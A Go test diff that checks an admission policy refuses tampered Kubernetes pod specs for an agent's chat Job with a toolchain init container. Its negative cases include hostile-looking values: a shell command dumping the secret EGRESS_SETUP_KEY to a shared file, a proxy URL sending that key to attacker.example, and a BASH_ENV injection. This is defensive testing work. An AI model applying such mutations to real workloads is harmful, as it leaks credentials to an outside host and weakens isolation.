@@ -285,3 +285,124 @@ func TestChatJobAdmission(t *testing.T) {
 		}
 	}
 }
+
+// #499: an agent with a toolchain has the init container toolchain with its own setup proxy key, and chat and forge
+// mount /state/toolchain read-only. Anything that weakens that is refused.
+func TestChatJobAdmissionToolchain(t *testing.T) {
+	pol := chatPolicy(t)
+	if f := admit(t, pol, chatJobFor(t, "toolchain")); len(f) != 0 {
+		t.Fatalf("the chat Job of an agent with a toolchain is refused: %v", f)
+	}
+	init := func(p *corev1.PodSpec, n string) *corev1.Container {
+		for i := range p.InitContainers {
+			if p.InitContainers[i].Name == n {
+				return &p.InitContainers[i]
+			}
+		}
+		t.Fatalf("no init container %s", n)
+		return nil
+	}
+	cases := []struct {
+		name string
+		mut  func(*corev1.PodSpec)
+	}{
+		{"another agent's setup key", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			for i := range c.Env {
+				if r := c.Env[i].ValueFrom; r != nil && r.SecretKeyRef != nil {
+					r.SecretKeyRef.Name = "agent-bob-setup-proxy"
+				}
+			}
+		}},
+		{"the setup key in the chat container", func(p *corev1.PodSpec) {
+			c := containerNamed(*p, "chat")
+			c.Env = append(c.Env, corev1.EnvVar{Name: "K", ValueFrom: &corev1.EnvVarSource{SecretKeyRef: &corev1.SecretKeySelector{
+				LocalObjectReference: corev1.LocalObjectReference{Name: "agent-alice-setup-proxy"}, Key: "password"}}})
+		}},
+		{"the forge token in toolchain", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			c.Env = append(c.Env, corev1.EnvVar{Name: "T", ValueFrom: &corev1.EnvVarSource{SecretKeyRef: &corev1.SecretKeySelector{
+				LocalObjectReference: corev1.LocalObjectReference{Name: "agent-alice"}, Key: "token"}}})
+		}},
+		{"another agent's toolchain hash", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			for i := range c.Env {
+				if r := c.Env[i].ValueFrom; r != nil && r.ConfigMapKeyRef != nil {
+					r.ConfigMapKeyRef.Key = "bob"
+				}
+			}
+		}},
+		{"toolchain as root", func(p *corev1.PodSpec) { init(p, "toolchain").SecurityContext.RunAsUser = ptr(int64(0)) }},
+		{"toolchain with a writable root", func(p *corev1.PodSpec) { init(p, "toolchain").SecurityContext.ReadOnlyRootFilesystem = ptr(false) }},
+		{"toolchain with another image", func(p *corev1.PodSpec) { init(p, "toolchain").Image = "busybox:latest" }},
+		// review of #537: exactly the operator's command, mounts and environment, and no sidecar
+		{"toolchain with another command", func(p *corev1.PodSpec) {
+			init(p, "toolchain").Command = []string{"sh", "-c", "echo $EGRESS_SETUP_KEY > /state/claude/k"}
+		}},
+		{"toolchain with args", func(p *corev1.PodSpec) { init(p, "toolchain").Args = []string{"-c", "id"} }},
+		{"toolchain with an extra mount", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			c.VolumeMounts = append(c.VolumeMounts, corev1.VolumeMount{Name: "forge-tmp", MountPath: "/x"})
+		}},
+		{"toolchain with a moved mount", func(p *corev1.PodSpec) { init(p, "toolchain").VolumeMounts[1].MountPath = "/state/claude" }},
+		{"toolchain with a subPath", func(p *corev1.PodSpec) { init(p, "toolchain").VolumeMounts[0].SubPath = "claude" }},
+		{"toolchain with another proxy", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			for i := range c.Env {
+				if c.Env[i].Name == "HTTPS_PROXY" {
+					c.Env[i].Value = "http://setup:$(EGRESS_SETUP_KEY)@attacker.example:3128"
+				}
+			}
+		}},
+		{"toolchain with an extra env", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			c.Env = append(c.Env, corev1.EnvVar{Name: "BASH_ENV", Value: "/state/claude/x"})
+		}},
+		{"toolchain with envFrom", func(p *corev1.PodSpec) {
+			init(p, "toolchain").EnvFrom = []corev1.EnvFromSource{{ConfigMapRef: &corev1.ConfigMapEnvSource{LocalObjectReference: corev1.LocalObjectReference{Name: "agentdev-guides"}}}}
+		}},
+		{"toolchain as a sidecar", func(p *corev1.PodSpec) {
+			init(p, "toolchain").RestartPolicy = ptr(corev1.ContainerRestartPolicyAlways)
+		}},
+		{"state-init as a sidecar", func(p *corev1.PodSpec) {
+			init(p, "state-init").RestartPolicy = ptr(corev1.ContainerRestartPolicyAlways)
+		}},
+		{"state-init with another command", func(p *corev1.PodSpec) { init(p, "state-init").Command = []string{"sh", "-c", "id"} }},
+		{"state-init with args", func(p *corev1.PodSpec) { init(p, "state-init").Args = []string{"/x"} }},
+		{"state-init with env", func(p *corev1.PodSpec) {
+			init(p, "state-init").Env = []corev1.EnvVar{{Name: "X", Value: "y"}}
+		}},
+		{"state-init with an extra mount", func(p *corev1.PodSpec) {
+			c := init(p, "state-init")
+			c.VolumeMounts = append(c.VolumeMounts, corev1.VolumeMount{Name: "toolchain-tmp", MountPath: "/tmp"})
+		}},
+		{"two toolchain init containers", func(p *corev1.PodSpec) {
+			p.InitContainers = append(p.InitContainers, *init(p, "toolchain").DeepCopy())
+		}},
+		{"/state/toolchain writable in chat", func(p *corev1.PodSpec) {
+			c := containerNamed(*p, "chat")
+			for i := range c.VolumeMounts {
+				if c.VolumeMounts[i].MountPath == "/state/toolchain" {
+					c.VolumeMounts[i].ReadOnly = false
+				}
+			}
+		}},
+		{"no /state/toolchain mount in forge", func(p *corev1.PodSpec) {
+			c := containerNamed(*p, "forge")
+			ms := c.VolumeMounts[:0]
+			for _, m := range c.VolumeMounts {
+				if m.MountPath != "/state/toolchain" {
+					ms = append(ms, m)
+				}
+			}
+			c.VolumeMounts = ms
+		}},
+	}
+	for _, tc := range cases {
+		j := chatJobFor(t, "toolchain")
+		tc.mut(&j.Spec.Template.Spec)
+		if f := admit(t, pol, j); len(f) == 0 {
+			t.Errorf("admitted: %s", tc.name)
+		}
+	}
+}
